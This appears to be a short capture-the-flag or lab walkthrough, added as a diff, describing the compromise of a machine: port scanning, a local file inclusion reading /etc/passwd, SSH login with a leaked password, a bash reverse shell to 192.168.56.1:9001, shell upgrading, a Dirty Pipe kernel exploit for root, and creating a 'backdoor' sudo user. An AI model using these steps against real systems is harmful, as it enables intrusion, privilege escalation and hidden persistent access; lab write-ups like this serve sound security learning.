@@ -1,0 +1,22 @@
+Nmap scan shows 3 open ports, ftp has anonymous, ssh and a web server on port 80.
+There is a robots txt disallowing several text files.
+
+Looks like there is some kind of LFI in index.php, lets find the parameter with ffuf. its ?drip=/etc/passwd
+We try to read the file in robots.txt again and in the source code we get a password... lets try to login, ssh logs us in and also in the GUI.
+
+bash -c 'bash - >& /dev/tcp/192.168.56.1/9001 0>&1'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo;fg
+reset
+echo TERM=xterm
+
+running linpeass shows that there are several kernel exploits, lest choose dirty pipe
+
+we got root
+
+Create a backdoor user and add ourselves to the sudoers file.
+username = backdoor
+password = 1412
+
+PWND
